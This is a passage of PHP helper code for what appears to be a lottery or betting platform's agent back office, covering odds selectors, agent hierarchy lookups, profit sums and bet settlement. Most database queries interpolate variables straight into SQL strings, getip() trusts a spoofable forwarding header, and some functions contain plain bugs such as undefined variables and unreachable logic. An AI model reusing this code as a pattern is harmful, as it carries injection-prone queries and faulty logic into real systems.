}
function peilvchaselect82($id, $class, $val, $gid)
{
    $peilvatt = transatt8($class, 'peilvatt', $gid);
    $maxatt   = p3(transatt8($class, 'maxatt', $gid));
    $id       = $id . $gid . $class;
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $maxatt; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselect8($id, $class, $val, $gid, $fenlei)
{
    $peilvatt = transatt8($class, 'peilvatt', $gid);
    $maxatt   = p3(transatt8($class, 'maxatt', $gid));
    $id       = $id . $fenlei . $class;
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $maxatt; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselecttop($id, $class)
{
    $peilvatt = p3(transatt($class, 'peilvatt'));
    $val      = transatt($class, 'maxatt');
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $peilvatt * 150; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselecttop8($id, $class,  $gid)
{
    $peilvatt = p3(transatt8($class, 'peilvatt', $gid));
    $val      = transatt8($class, 'maxatt', $gid);
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $peilvatt * 150; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}

function gettopuid($uid, $layer)
{
    $tb_user = 'x_user';
    if ($layer == 1)
        return $uid;
    $user = Db::query("select fid1 from `$tb_user` where userid='$uid'");
    return $user[0]['fid1'];
}
function moren($as, $bs)
{
    return $as;
    if ($as < $bs)
        return $bs;
    else
        return $as;
}
function page($pc, $p)
{
    $str = '';
    for ($i = 1; $i <= $pc; $i++) {
        $str .= "<a href='javascript:void(0);' class='page";
        if ($i == $p) {
            $str .= " red";
        }
        $str .= "'>" . $i . "<a>&nbsp;&nbsp;";
    }
    return $str;
}
function gettopid($uid)
{
    while (1) {
        $user = db('user')->where('userid', $uid)->find();
        if ($user['layer'] == 1) {
            return $uid;
        }
        if ($user['layer'] == 2) {
            return $user['fid'];
        }
        $uid = $user['fid'];
    }
}
function getzhong($qishu, $pid)
{
    $z = db('z')->where('gid', session('gid'))->where('qishu', $qishu)->where('pid', $pid)->find();
    return pr0($z['1']);
}
function transxtype($val)
{
    if ($val == 0) {
        $val = "下注";
    } else if ($val == 1) {
        $val = "内补";
    } else if ($val == 2) {
        $val = "外补";
    }
    return $val;
}
function transzt($val)
{
    if ($val == 7) {
        $val = "无效";
    } else {
        $val = "正常";
    }
    return $val;
}
function transflytype($v)
{
    if ($v == 0) {
        $v = "手动";
    } else {
        $v = "自动";
    }
    return $v;
}
function transfly($v)
{
    if ($v == 0)
        $v = '禁止';
    else if ($v == 1)
        $v = '内补';
    else if ($v == 2)
        $v = '外补';
    else if ($v == 3)
        $v = '内外补';
    return $v;
}
function getip()
{
    static $realip;
    if (isset($_SERVER)) {
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $realip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $realip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")) {
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv("HTTP_CLIENT_IP")) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else {
            $realip = getenv("REMOTE_ADDR");
        }
    }
    if (strpos($realip, ',')) {
        $realip = explode(',', $realip);
        $realip = $realip[0];
    }
    if (strlen($ip) > 15) {
        return '0.0.0.0';
    }
    return $realip;
}
function fast3qishu($qishu)
{
    $cq  = count($qishu);
    $cq3 = $cq % 3 == 0 ? $cq / 3 : (($cq - $cq % 3) / 3) + 1;
    for ($i = 0; $i < $cq3; $i++) {
        if ($qishu[$i * 3 + 1] == '' & $qishu[$i * 3 + 2] == '') {
            $q[$i] = $qishu[$i * 3] . ' ~ ' . $qishu[$i * 3];
        } else if ($qishu[$i * 3 + 2] == '') {
            $q[$i] = $qishu[$i * 3] . ' ~ ' . $qishu[$i * 3 + 1];
        } else {
            $q[$i] = $qishu[$i * 3] . ' ~ ' . $qishu[$i * 3 + 2];
        }
    }
    return $q;
}
function rserver()
{
    $config = db('config')->find();
    for ($i = 1; $i <= 6; $i++) {
        if ($_SERVER['SERVER_ADDR'] == $config['s' . $i]) {
            return $i;
        }
    }
}
function wf($g, $b, $s, $c, $p)
{
    $p = "『" . $p . "』";
    if ($b == "番摊") {
        return $c . '-' . $p;
    } else if ($g == 100 || $g == 200) {
        if ($s == '過關') {
            return $p;
        } else if ($b == '生肖連' || $b == '尾數連') {
            return  $p;
        } else {
            return $s . '-' . $p;
        }
    } else if (($g == 101 | $g == 163) && $s != '番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s . '-' . $p;
                break;
            case "1字组合":
                return $c . '-' . $p;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "2字和数":
                return $s . '-' . $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . '-' . $c . '-' . $p;
                else
                    return $s . '-' . $p;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . '-' . $c . '-' . $p;
                else
                    return $s . '-' . $p;
                break;
            case "组选3":
                return $p;
                break;
            case "组选6":
                return $p;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c . '-' . $p;
                break;
            case "前中后三":
            case "前三":
                return $s . '-' . $p;
                break;
        }
    } else {
        return $b . '-' . $p;
    }
}
function encode($arr)
{
    $code = base64_encode(implode('_', $arr));
    $cc   = strlen($code);
    $n1   = array();
    $n2   = array();
    $n3   = array();
    for ($i = 0; $i < $cc; $i++) {
        if ($i % 3 == 0) {
            $n1[] = $code[$i];
        } else if ($i % 3 == 1) {
            $n2[] = $code[$i];
        } else if ($i % 3 == 2) {
            $n3[] = $code[$i];
        }
    }
    return implode("", $n3) . implode("", $n2) . implode("", $n1);
}
function decode($str)
{
    $ct = strlen($str);
    $yu = $ct % 3;
    if ($yu == 2) {
        $chu = ($ct - 1) / 3;
        $n3  = substr($str, 0, $chu);
        $n2  = substr($str, $chu, $chu * 2 + 1);
        $n1  = substr($str, $chu * 2 + 1);
    } else {
        $chu = ($ct - $yu) / 3;
        $n3  = substr($str, 0, $chu);
        $n2  = substr($str, $chu, $chu * 2);
        $n1  = substr($str, $chu * 2);
    }
    $code = '';
    $chu += 1;
    for ($i = 0; $i < $chu; $i++) {
        $code .= $n1[$i] . $n2[$i] . $n3[$i];
    }
    $code = base64_decode($code);
    $arr  = explode('_', $code);
    return $arr;
}
function transip($ip)
{
    if (!preg_match("/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/", $ip)) return '';
    // include(APP_PATH."/hide/controller/Iplocation_Class.php");
    // $ips = new IpLocation(APP_PATH."/hide/controller/QQWry.Dat");
    // return mb_convert_encoding($ips->getaddress($ip), 'utf-8', 'GBK');
    // return iconv('','utf-8',$ips->getaddress($ip));
}

function getonline($uid)
{
    if ($uid == 99999999) {
        $online = db('online')->count();
        return $online;
    }
    $layer = transuser($uid, "layer");
    $online = db('user')->where("fid" . $layer, $uid)->where("online", 1)->count();
    return $online;
}
function messreplace($str, $arr)
{
    $str = str_replace('{期数}', $arr[0], $str);
    $str = str_replace('{公司名称}', $arr[1], $str);
    $str = str_replace('{开盘时间}', $arr[2], $str);
    $str = str_replace('{关盘时间}', $arr[3], $str);
    $str = str_replace('{开奖时间}', $arr[4], $str);
    return $str;
}
function rpage($p)
{
    if (!is_numeric($p) | $p < 0 | $p % 1 != 0) $p = 1;
    return $p;
}

function safehtml($text)
{
    $text = stripslashes($text);
    $text = eregi_replace("<a[^>]+href *= *([^ >]+)[^>]*[>]?", "<a href=\\1>", $text);
    $text = eregi_replace("<img[^>]+src *= *([^ >]+)[^>]*>", "<img src=\\1 alt=\"\" border=\"0\">", $text);
    $text = eregi_replace("<(abbr|acronym|b|big|blockquote|center|code|dd|del|dl|dt|em|h1|h2|h3|h4|h5|h6|hr|i|ins|kbd|li|ol|p|pre|q|s|samp|small|strike|strong|sub|sup|tt|u|ul|var) +[^>]*>", "<\\1>", $text);
    $text = eregi_replace("<(br)[ ]*[^>]*>", "<\\1 />", $text);
    return $text;
}

function safeshtml($text)
{
    $text = stripslashes($text);
    $text = strip_tags($text, "<a><b><em><i><strong><u>");
    $text = eregi_replace("<a[^>]+href *= *([^ >]+)[^>]*[>]?", "<a href=\\1>", $text);
    $text = eregi_replace("<(b|em|i|strong|u) +[^>]*>", "<\\1>", $text);
    return $text;
}

function array_filters($v)
{
    if ($v != "") {
        return true;
    }
    return false;
}
function getzcp($zc, $sql)
{
    $res = Db::query("select min($zc),max($zc) $sql");
    if ($res[0]["min($zc)"] == $res[0]["max($zc)"]) {
        return $res[0]["min($zc)"] . '%';
    } else {
        return $res[0]["min($zc)"] . '%/' . $res[0]["max($zc)"] . '%';;
    }
}
function getjrsy($userid)
{
    include(APP_PATH . '/hide/controller/comm2.inc.php');
    if ($userid == 99999999) {
        $layer = 0;
        $myzcstr = 'zc' . $layer;
        $mypointsstr = 'points' . $layer;
        $mypeilv1str = 'peilv1' . $layer;
        $mypeilv2str = 'peilv2' . $layer;

        $uidstrdown = 'uid' . ($layer + 1);
        $pointsstrdown = 'points' . ($layer + 1);
        $peilv1strdown = 'peilv1' . ($layer + 1);
        $peilv2strdown = 'peilv2' . ($layer + 1);
        $theday = getthisdate();
        $whi = " from `$tb_lib` where dates='$theday' and bs=1 and xtype!=2 and z not in(2,7,9)";
        $sql = "select sum($myzcstr*je/100)
                           ,sum(if($uidstrdown=0,(points*$myzcstr*je/(100*100)),$pointsstrdown*$myzcstr*je/(100*100))) 
                             $whi";
        $psql->query($sql);
        $psql->next_record();
        $mezc = $psql->f(0);
        $meshui = $psql->f(1);
        $sql = "select sum(if($uidstrdown=0,(peilv1*$myzcstr)*je/100,$peilv1strdown*$myzcstr*je/100)) $whi and z=1";
        $psql->query($sql);
        $psql->next_record();
        $mezhong = pr1($psql->f(0));
        $sql = "select sum(if($uidstrdown=0,(peilv2*$myzcstr)*je/100,$peilv2strdown*$myzcstr*je/100)) $whi and z=3";
        $psql->query($sql);
        $psql->next_record();
        $mezhong += pr1($psql->f(0));

        $yk = p1($mezc - $mezhong - $meshui);
    } else {
        $layer = transuser($userid, 'layer');
        $myid = 'uid' . $layer;
        $myzcstr = 'zc' . $layer;
        $mypointsstr = 'points' . $layer;
        $mypeilv1str = 'peilv1' . $layer;
        $mypeilv2str = 'peilv2' . $layer;
        if ($layer < 8) {
            $uidstrdown = 'uid' . ($layer + 1);
            $pointsstrdown = 'points' . ($layer + 1);
            $peilv1strdown = 'peilv1' . ($layer + 1);
            $peilv2strdown = 'peilv2' . ($layer + 1);
        } else {
            $uidstrdown = 'userid';
            $pointsstrdown = 'points';
            $peilv1strdown = 'peilv1';
            $peilv2strdown = 'peilv2';
        }
        $theday = getthisdate();
        $whi = " from `$tb_lib` where $myid='$userid' and dates='$theday' and bs=1 and xtype!=2 and z not in(2,7,9)";
        $sql = "select sum($myzcstr*je/100)
                           ,sum(if($uidstrdown=0,(points*$myzcstr*je/(100*100)),$pointsstrdown*$myzcstr*je/(100*100))) 
                             $whi";
        $psql->query($sql);
        $psql->next_record();
        $mezc = $psql->f(0);
        $meshui = $psql->f(1);
        $sql = "select sum(if($uidstrdown=0,(peilv1*$myzcstr)*je/100,$peilv1strdown*$myzcstr*je/100)) $whi and z=1";
        $psql->query($sql);
        $psql->next_record();
        $mezhong = pr1($psql->f(0));
        $sql = "select sum(if($uidstrdown=0,(peilv2*$myzcstr)*je/100,$peilv2strdown*$myzcstr*je/100)) $whi and z=3";
        $psql->query($sql);
        $psql->next_record();
        $mezhong += pr1($psql->f(0));

        $yk = p1($mezc - $mezhong - $meshui);
    }

    return $yk;
}


function userflylog($v1, $v2)
{
    $modiip   = getip();
    $tb_user_edit = 'x_user_edit';
    $userid = CHECK_ID;
    if ($v1["je"] != $v2["je"] || $v1["ifok"] != $v2["ifok"]) {
        $action = "自动补货";
        $uid = $userid;
        $sql      = "insert into `$tb_user_edit` set modiip='$modiip',moditime=NOW(),action='$action',userid='$uid'";
        $sql .= ",modiuser='$userid',modisonuser='$userid2'";
        $title = $v2["gname"] . "<br>【" . $v2["ftypename"] . " 自动补货】";
        $oldvalue = "注额：" . $v1["je"] . "<br>【" . transflys($v1["ifok"]) . "】";
        $newvalue = "注额：" . $v2["je"] . "<br>【" . transflys($v2["ifok"]) . "】";
        $sql .= ",title='$title',oldvalue='$oldvalue',newvalue='$newvalue'";
        Db::query($sql);
    }
}

function transflys($v)
{
    if ($v == 1) {
        return "启用";
    } else {
        return "禁用";
    }
}
function getsqls($date, $game, $u, $thisday, $qishu = "")
{

    $whi = [];
    foreach ($date as $v) {
        if ($v == $thisday) {
            $w1 = " from `x_lib` ";
        } else {
            $w1 = " from `x_lib_" . str_replace('-', '', $v) . "` ";
        }
        foreach ($u as $k2 => $v2) {
            if ($qishu != "" && is_numeric($qishu)) {
                if (count($game) == 1) {
                    $whi[] = $w1 . " where $k2='$v2' and gid = '" . $game[0] . "' and qishu='$qishu' ";
                } else {
                    $whi[] = $w1 . " where $k2='$v2' and qishu='$qishu' and gid in(" . implode(',', $game) . ") ";
                }
            } else {
                if (count($game) == 1) {
                    $whi[] = $w1 . " where $k2='$v2' and gid = '" . $game[0] . "'";
                } else {
                    $whi[] = $w1 . " where $k2='$v2' and gid in(" . implode(',', $game) . ") ";
                }
            }
        }
    }
    return $whi;
}
function getsqls2($date, $game, $u, $thisday)
{

    $whi = [];
    foreach ($date as $v) {
        if ($v == $thisday) {
            $w1 = " from `x_lib` ";
        } else {
            $w1 = " from `x_lib_" . str_replace('-', '', $v) . "` ";
        }
        foreach ($game as $v1) {
            $w2 = $w1 . " where gid='$v1' ";
            foreach ($u as $k2 => $v2) {
                $whi[] = $w2 . " and $k2='$v2' ";
            }
        }
    }
    return $whi;
}
function getp107($bid, $ab, $abcd, $cid)
{
    global $tsql, $psql, $tb_play, $tb_bclass, $tb_sclass, $tb_class, $config, $userid, $tb_play_user, $gid;
    $time = time();
    $sql2 = "";
    if ($bid == 0) {
        $sql = "select * from `$tb_play` where gid='$gid' and bid=23378805 order by bid,xsort";
        $sql2 = "select * from `$tb_play` where gid='$gid' and name!='质' and name!='合' and bid<23378805 order by bid,xsort";
    } else if ($bid == 1) {
        $sql = "select * from `$tb_play` where gid='$gid' and bid>=23378807 and bid<=23378813 order by bid,sid,xsort";
    } else if ($bid == 2) {
        $sql = "select * from `$tb_play` where gid='$gid' and bid>=23378816 and bid<=23378823 order by bid,sid,xsort";
    } else if ($bid == 3) {
        $sql = "select * from `$tb_play` where gid='$gid' and bid=26000000 order by bid,sid,cid,xsort";
    }
    $tsql->query($sql);
    $i    = 0;
    $p    = array();
    $cid  = 0;
    $sid  = 0;
    $csid = 1;
    $ccid = 1;
    $abcd = strtolower($abcd);
    while ($tsql->next_record()) {
        if ($sid != $tsql->f('sid') & $sid != 0)
            $csid++;
        if ($cid != $tsql->f('cid') & $cid != 0)
            $ccid++;
        if ($cid != $tsql->f('cid')) {
            $psql->query("select dftype,ftype,name from `$tb_class` where gid='$gid' and cid='" . $tsql->f('cid') . "'");
            $psql->next_record();
            $ftype           = $psql->f('ftype');
            $dftype           = $psql->f('dftype');
            $cname = $psql->f('name');
        }
        if ($sid != $tsql->f('sid')) {
            $sname = transs('name', $tsql->f('sid'));
        }
        $p[$i]['ftype']  = $ftype;
        $p[$i]['dftype']  = $dftype;
        $p[$i]['bid']    = $tsql->f('bid');
        $p[$i]['sid']    = $tsql->f('sid');
        $p[$i]['sname']  = $sname;
        $p[$i]['cid']    = $tsql->f('cid');
        $p[$i]['cname']  = $cname;
        $p[$i]['pid']    = $tsql->f('pid');
        $p[$i]['name']   = $tsql->f('name');
        $p[$i]['ifok']   = $tsql->f('ifok');
        $p[$i]['xsort']  = $tsql->f('xsort');
        $p[$i]['znum1']    = $tsql->f('znum1');
        $p[$i]['peilv1'] = (float) ($tsql->f('peilv1') - $config['patt'][$ftype][$abcd]);

        if ($config['pan'][$ftype]['ab'] == 1 & ($ab == 'B' | $ab == 'b')) {
            $p[$i]['peilv1'] += $config['patt'][$ftype]['ab'];
        }
        $p[$i]['peilv2'] = (float) $tsql->f('peilv2');
        $p[$i]['mp1']    = (float) $tsql->f('mp1');
        $p[$i]['mp2']    = (float) $tsql->f('mp2');
        $cid             = $tsql->f('cid');
        $sid             = $tsql->f('sid');
        $bid             = $tsql->f('bid');
        $p[$i]['cid']    = $tsql->f('cid');
        $p[$i]['sid']    = $tsql->f('sid');
        $p[$i]['bid']    = $tsql->f('bid');
        $i++;
    }
    if ($sql2 != "") {
        $tsql->query($sql2);
        while ($tsql->next_record()) {
            if ($sid != $tsql->f('sid') & $sid != 0)
                $csid++;
            if ($cid != $tsql->f('cid') & $cid != 0)
                $ccid++;
            if ($cid != $tsql->f('cid')) {
                $psql->query("select dftype,ftype,name from `$tb_class` where gid='$gid' and cid='" . $tsql->f('cid') . "'");
                $psql->next_record();
                $ftype           = $psql->f('ftype');
                $dftype           = $psql->f('dftype');
                $cname = $psql->f('name');
            }
            if ($sid != $tsql->f('sid')) {
                $sname = transs('name', $tsql->f('sid'));
            }
            $p[$i]['ftype']  = $ftype;
            $p[$i]['dftype']  = $dftype;
            $p[$i]['bid']    = $tsql->f('bid');
            $p[$i]['sid']    = $tsql->f('sid');
            $p[$i]['sname']  = $sname;
            $p[$i]['cid']    = $tsql->f('cid');
            $p[$i]['cname']  = $cname;
            $p[$i]['pid']    = $tsql->f('pid');
            $p[$i]['name']   = $tsql->f('name');
            $p[$i]['ifok']   = $tsql->f('ifok');
            $p[$i]['xsort']  = $tsql->f('xsort');
            $p[$i]['znum1']    = $tsql->f('znum1');
            $p[$i]['peilv1'] = (float) ($tsql->f('peilv1') - $config['patt'][$ftype][$abcd]);

            if ($config['pan'][$ftype]['ab'] == 1 & ($ab == 'B' | $ab == 'b')) {
                $p[$i]['peilv1'] += $config['patt'][$ftype]['ab'];
            }
            $p[$i]['peilv2'] = (float) $tsql->f('peilv2');
            $p[$i]['mp1']    = (float) $tsql->f('mp1');
            $p[$i]['mp2']    = (float) $tsql->f('mp2');
            $cid             = $tsql->f('cid');
            $sid             = $tsql->f('sid');
            $bid             = $tsql->f('bid');
            $p[$i]['cid']    = $tsql->f('cid');
            $p[$i]['sid']    = $tsql->f('sid');
            $p[$i]['bid']    = $tsql->f('bid');
            $i++;
        }
    }
    $p[0]['csid'] = $csid;
    $p[0]['ccid'] = $ccid;
    return $p;
}
function sumbb($arr)
{
    $r = [0, 0, 0, 0, 0, 0, 0, 0];
    foreach ($arr as $k => $v) {
        foreach ($v as $k1 => $v1) {
            $r[$k1] += $v1;
        }
    }
    return $r;
}
function searchzc($arr, $type = 2)
{
    $r = [0, 0, 0, 0, 0, 100];
    foreach ($arr as $k => $v) {
        if ($v[4] == null || $v[5] == null) continue;
        if ($r[4] < $v[4]) {
            $r[4] = $v[4];
        }
        if ($r[5] > $v[5]) {
            $r[5] = $v[5];
        }
    }
    return $r;
}
function searchzcb($arr, $type = 2)
{
    $r = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 100];
    foreach ($arr as $k => $v) {
        if ($v[12] == null || $v[13] == null) continue;
        if ($r[12] < $v[12]) {
            $r[12] = $v[12];
        }
        if ($r[13] > $v[13]) {
            $r[13] = $v[13];
        }
    }
    return $r;
}
function getusergroup3($uid, $layer)
{
    $str = $uid;
    $tb_user = 'x_user';
    $melayer = transuser($uid, 'layer') + 1;
    for ($i = $melayer; $i <= $layer; $i++) {
        $user = Db::query("select userid from `{$tb_user}` where fid in ({$str}) and layer='{$i}'");
        foreach ($user as $value) {
            if ($value['userid'] != '') {
                if ($i == $layer) {
                    $xout .= ',' . $value['userid'];
                } else {
                    if (!strpos($str, $value['userid'])) {
                        $str .= ',' . $value['userid'];
                    }
                }
            }
        }
    }
    return substr($xout, 1);
}
function ftypes($ftype)
{
    $arr = array();
    foreach ($ftype as $k => $v) {
        $arr[$k] = $v['name'];
    }
    return $arr;
}
function rm($v)
{
    if (!is_numeric($v))
        return 49;
    if ($v < 10 & strlen($v) == 1)
        $v = '0' . $v;
    return $v;
}
function closepan()
{
    $tb_config = 'x_config';
    Db::query("update `$tb_config` set tepan=0,otherpan=0,autoopenpan=0");
    echo 1;
}
function getlibje($gid, $qs)
{
    $tb_lib = 'x_lib';
    $rs = Db::query("select count(id),sum(je),sum(je*zc0/100) from `$tb_lib` where gid='$gid' and qishu='$qs' and xtype!=2");
    $r2 = Db::query(
        "select count(id),sum(je) from `$tb_lib` where gid='$gid' and qishu='$qs' and userid=99999999"
    );
    return array(
        pr0($rs[0][0]),
        pr0($rs[0][1]),
        pr0($rs[0][2]),
        pr0($r2[0][0]),
        pr0($r2[0][1])
    );
}
function getb()
{
    $tb_bclass = 'x_bclass';
    $gid = session('gid');
    if ($gid == 107) {
        $b[0]['bid'] = 0;
        $b[0]['i'] = 0;
        $b[0]['name'] = '冠、亚军组合';
        $b[1]['bid'] = 1;
        $b[1]['i'] = 1;
        $b[1]['name'] = '三、四、五、六名';
        $b[2]['bid'] = 2;
        $b[2]['i'] = 2;
        $b[2]['name'] = '七、八、九、十名';
    } else {

        $bclass = Db::query("select * from `$tb_bclass` where gid='$gid' and ifok=1 order by xsort");
        $b = array();
        foreach ($bclass as $i => $value) {
            $b[$i]['bid']  = $value['bid'];
            $b[$i]['name'] = $value['name'];
            $b[$i]['i']    = $i;
        }
    }
    return $b;
}
function ztype($v)
{
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $ztype         = json_decode($game['ztype'], true);
    $i = 0;
    foreach ($ztype as $n) {
        if ($n == $v) {
            break;
        }
        $i++;
    }
    return $i;
}
function mtype($v)
{
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $mtype         = json_decode($game['mtype'], true);
    $i = 0;
    foreach ($mtype as $n) {
        if ($n == $v) {
            break;
        }
        $i++;
    }
    return $i;
}
function ftype($v)
{
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $ftype         = json_decode($game['ftype'], true);
    foreach ($ftype as $key => $n) {
        if ($n == $v) {
            $i = $key;
            break;
        }
    }
    $i = str_replace('p', '', $key);
    return $i;
}
function dftype($v)
{
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $dftype         = json_decode($game['dftype'], true);
    foreach ($dftype as $key => $n) {
        if ($n == $v) {
            $i = $key;
            break;
        }
    }
    $i = str_replace('p', '', $key);
    return $i;
}
function calc($fenlei, $gid, $cs, $qishu, $mnum, $ztype, $mtype, $qz = false)
{
    include(APP_PATH . '/hide/controller/db2.php');
    // global $fsql, $tsql, $psql, $tb_bclass, $tb_sclass, $tb_class, $tb_play, $tb_lib, $tb_user, $tb_kj, $tb_z, $tb_config,$tb_shui;
    $whi = " gid='{$gid}' and qishu='{$qishu}' ";
    $kjInfo = Db::query("select * from `{$tb_kj}` where {$whi}");
    if ($kjInfo[0]['m1'] == '') {
        return "未结算订单";
    }
    if ($kjInfo[0]['js'] == 1 && !$qz) {
        // return "该期数已经结算过";
    }
    $lib = Db::query("update `{$tb_lib}` set kk=1,z=9,prize=0 where {$whi} and z!=7");
    $kj = [];
    $kj[0] = [];
    $kj[0]['m'] = [];
    for ($i = 1; $i <= $mnum; $i++) {
        $kj[0]['m'][] = $kjInfo[0]["m" . $i];
    }
    $lastcode = $kjInfo[0]["m8"] ?? 0;
    $tmp = [];
    $marr = [];
    if ($fenlei == 100) {
        $rs = Db::query("select ma,maxpc from `{$tb_config}`");
        $marrs = json_decode($rs[0]['ma'], true);
        foreach ($marrs as $v) {
            foreach ($v as $k1 => $v1) {
                $marr[$k1] = explode(',', $v1);
            }
        }
        $marr['pc'] = $rs[0]['maxpc'];
    }
    $z = Db::query("delete from `$tb_z` where gid='$gid' and qishu='$qishu'");
    $sql = "select bid,sid,cid,pid,content,bz,ab,userid,bz from `{$tb_lib}` where gid='{$gid}' and qishu='{$qishu}' group by cid,pid,content";
    $lib = Db::query($sql);
    $cl = count($lib);
    for ($i = 0; $i < 1; $i++) {
        $zhong = 0;
        $ft = 0;
        if (isset($cs['ft']) && $cs['ft'] == 1) {
            // $ft = getft($kj[$i]['m'],$cs);
            $ft = $lastcode % 4 == 0 ? 4 : $lastcode % 4;
        }
        $sx = [];
        $ws = [];
        if ($fenlei == 100) {
            foreach ($kj[$i]['m'] as $ks => $vs) {
                $sx[] = sx_100($vs, $marr);
                $ws[] = $vs % 10;
            }
        }
        for ($j = 0; $j < $cl; $j++) {
            $flag = 0;
            // if ($tmpcid != $lib[$j]['cid']) {
            if (!isset($tmp['c' . $lib[$j]['cid']])) {
                $class = Db::query("select name,mtype from `{$tb_class}` where gid='{$gid}' and cid='{$lib[$j]['cid']}'");
                $tmp['c' . $lib[$j]['cid']]['name'] = $class[0]['name'];
                $tmp['c' . $lib[$j]['cid']]['mtype'] = $class[0]['mtype'];
                $tmp['c' . $lib[$j]['cid']]['cm'] = $mtype[$class[0]['mtype']];
            }
            if (!isset($tmp['s' . $lib[$j]['sid']])) {
                $tmp['s' . $lib[$j]['sid']] = transs8('name', $lib[$j]['sid'], $gid);
            }
            if (!isset($tmp['b' . $lib[$j]['bid']])) {
                $tmp['b' . $lib[$j]['bid']] = transb8('name', $lib[$j]['bid'], $gid);
            }
            // }
            if (!isset($tmp['p' . $lib[$j]['pid']])) {
                $play = Db::query("select name,ztype,znum1,znum2 from `{$tb_play}` where gid='{$gid}' and pid='{$lib[$j]['pid']}'");
                $tmp['p' . $lib[$j]['pid']]['name'] = $play[0]["name"];
                $tmp['p' . $lib[$j]['pid']]['ztype'] = $ztype[$play[0]["ztype"]];
                $tmp['p' . $lib[$j]['pid']]['znum1'] = $play[0]['znum1'];
                $tmp['p' . $lib[$j]['pid']]['wfname'] = preg_replace('/\d/', '', $play[0]['name']);
                $tmp['p' . $lib[$j]['pid']]['znum2'] = $play[0]['znum2'];
            }
            if ($fenlei == 100 && $bid == 23378733) {
                // 过关
                $bz = json_decode($lib[$j]['bz'], true);
                $zflag = 0;
                $xflag = 0;
                foreach ($bz as $v) {
                    $rmtype = Db::query("select mtype from `{$tb_class}` where gid='{$gid}' and sid='" . $v['sid'] . "' and cid='" . $v['cid'] . "'");
                    $rpname = Db::query("select name,ztype from `{$tb_play}` where gid='{$gid}' and sid='" . $v['sid'] . "' and cid='" . $v['cid'] . "' and pid='" . $v['pid'] . "'");
                    if (in_array($kj[$i]['m'][$rmtype[0]['mtype'] - 1], $marr[$rpname[0]['name']])) {
                        $zflag++;
                    }
                    if ($kj[$i]['m'][$rmtype[0]['mtype'] - 1] == 25 && ($rpname[0]['name'] == '合尾大' || $rpname[0]['name'] == '合尾大')) {
                        $xflag = 2;
                    }
                    if ($kj[$i]['m'][$rmtype[0]['mtype'] - 1] == 49 && $rpname[0]['name'] != '合尾大' && $rpname[0]['name'] != '合尾大' && $rpname[0]['ztype'] == 1) {
                        $xflag = 2;
                    }
                }
                if ($xflag == 2) {
                    $flag = [2];
                } else {
                    $zflag == count($bz) && $zflag > 0 && ($flag = [1]);
                }
            } else {
                $flag = calcjs($fenlei, $gid, $kj[$i]['m'], $tmp['b' . $lib[$j]['bid']], $tmp['s' . $lib[$j]['sid']], $tmp['c' . $lib[$j]['cid']], $tmp['p' . $lib[$j]['pid']], $lib[$j]['content'], $ft, $marr, $sx, $ws);
            }
            if ($flag[0] == 5) {
                $zflag = $flag[1];
                Db::query("update `{$tb_lib}` set kk=1,z='5',prize=((peilv1-1)*{$zflag}*je+je) where {$whi} and pid='{$lib[$j]['pid']}' and z!=7");
            } else {
                if ($fenlei == 100 && $lib[$j]['bid'] == 23378733 && $flag[0] == 1) {
                    $libInfo = Db::query("select sum(je*(peilv1-1+points/100)) from `{$tb_lib}` where {$whi} and pid='{$lib[$j]['pid']}' and content='{$lib[$j]['content']}' and z!=7 ");
                    if ($libInfo[0]['sum(je*(peilv1-1+points/100))'] > $marr['pc']) {
                        Db::query("update `{$tb_lib}` set kk=1,z='5',prize='{$marr['pc']}' where {$whi} and pid='{$lib[$j]['pid']}' and content='{$lib[$j]['content']}' and z!=7 ");
                    } else {
                        Db::query("update `{$tb_lib}` set kk=1,z='1' where {$whi} and pid='{$lib[$j]['pid']}' and content='{$lib[$j]['content']}' and z!=7 ");
                    }
                } else {
                    if ($lib[$j]['content'] != "") {
                        if (($tmp['p' . $lib[$j]['pid']]['name'] == '三中二' || $tmp['p' . $lib[$j]['pid']]['name'] == '二中特') && ($flag[0] == 3 || $flag[0] == 1)) {
                            $tlm = Db::query("select * from `$tb_lib` where {$whi} and pid='{$lib[$j]['pid']}' and content='{$lib[$j]['content']}' and z!=7");
                            foreach ($tlm as $ka => $va) {
                                $sql = '';
                                $pei = json_decode($va['bz'], true);
